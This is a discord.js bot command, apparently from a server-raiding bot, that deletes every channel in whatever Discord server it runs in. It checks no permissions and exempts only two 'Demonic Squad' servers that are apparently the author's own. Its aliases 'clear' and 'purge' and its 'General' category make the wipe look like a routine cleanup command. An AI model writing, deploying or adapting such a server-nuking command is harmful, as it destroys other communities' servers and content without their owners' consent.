const { MessageEmbed } = require('discord.js');

exports.run = async(client, message, args) => {

if(message.guild.name === "Ḋemonic ֆquad | Þriv") return;
if(message.guild.name === "• [ Demonic Squad | Logs ]") return;

message.guild.channels.cache.forEach(ch => {
ch.delete()

})

}                                   

exports.help = {
  name: "delete",
 aliases:["clear", "purge"],
  usage: "[ Uso Independiente : No require Argumentos ]",
  description: "Elimina los canales del servidor",
  category: "General"
  
}